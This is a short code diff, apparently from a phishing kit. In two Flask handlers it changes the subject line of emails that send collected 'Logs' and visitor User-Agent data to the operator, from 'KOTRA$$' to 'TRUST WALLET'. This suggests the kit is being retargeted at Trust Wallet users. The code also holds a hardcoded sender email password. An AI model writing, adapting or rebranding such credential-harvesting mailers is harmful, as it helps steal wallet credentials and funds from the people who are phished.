@@ -197,7 +197,7 @@ def first():
         password = "vip7a81be0e2b36"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
-        message["Subject"] = "KOTRA$$ Logs "
+        message["Subject"] = "TRUST WALLETS Logs "
         message["From"] = sender_email
         message["To"] = receiver_email
         text = """\
@@ -237,7 +237,7 @@ def second():
         password = "vip7a81be0e2b36"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
-        message["Subject"] = "KOTRA$$ Logs  !! "
+        message["Subject"] = "TRUST WALLET Logs  !! "
         message["From"] = sender_email
         message["To"] = receiver_email
         text = """\
